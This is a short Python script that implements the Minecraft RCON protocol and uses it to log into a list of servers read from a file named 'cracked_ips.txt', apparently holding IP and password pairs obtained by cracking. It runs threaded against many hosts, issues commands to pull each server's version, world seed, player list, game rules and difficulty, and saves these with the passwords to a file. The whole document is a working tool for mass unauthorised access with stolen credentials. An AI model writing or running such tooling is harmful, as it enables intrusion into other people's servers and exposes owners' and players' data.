import socket
import struct
import random
import sys
from concurrent.futures import ThreadPoolExecutor

def rcon_command(ip, port, password, command):
    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((ip, port))
        body = password.encode() + b'\x00\x00'
        pkt = struct.pack("<iii", 8 + len(body), random.randint(1, 2**31-1), 3) + body
        sock.send(pkt)
        resp_len = struct.unpack("<i", sock.recv(4))[0]
        sock.recv(resp_len)
        cmd_body = command.encode() + b'\x00\x00'
        cmd_pkt = struct.pack("<iii", 8 + len(cmd_body), random.randint(1, 2**31-1), 2) + cmd_body
        sock.send(cmd_pkt)
        resp_len = struct.unpack("<i", sock.recv(4))[0]
        resp_data = sock.recv(resp_len)
        sock.close()
        if len(resp_data) > 8:
            return resp_data[8:-2].decode('utf-8', errors='ignore')
        return ""
    except:
        return "ERROR"

def extract_server(ip_pwd):
    ip, pwd = ip_pwd.split(':')
    port = 25575
    print(f"\n[+] Extracting from {ip}")
    info = {
        'ip': ip,
        'password': pwd,
        'version': rcon_command(ip, port, pwd, "version"),
        'seed': rcon_command(ip, port, pwd, "seed"),
        'players': rcon_command(ip, port, pwd, "list"),
        'gamerules': rcon_command(ip, port, pwd, "gamerule"),
        'difficulty': rcon_command(ip, port, pwd, "difficulty"),
    }
    with open("server_data.txt", "a") as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"IP: {ip}\nPassword: {pwd}\n")
        for k, v in info.items():
            if k not in ['ip', 'password']:
                f.write(f"{k}: {v[:200]}\n")
    print(f"    Version: {info['version'][:50]}")
    print(f"    Players: {info['players'][:50]}")
    return info

def main():
    with open("cracked_ips.txt") as f:
        targets = [line.strip() for line in f if line.strip()]
    print(f"[*] Extracting data from {len(targets)} servers")
    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(extract_server, targets)
    print("\n[*] Data saved to server_data.txt")

if __name__ == "__main__":
    main()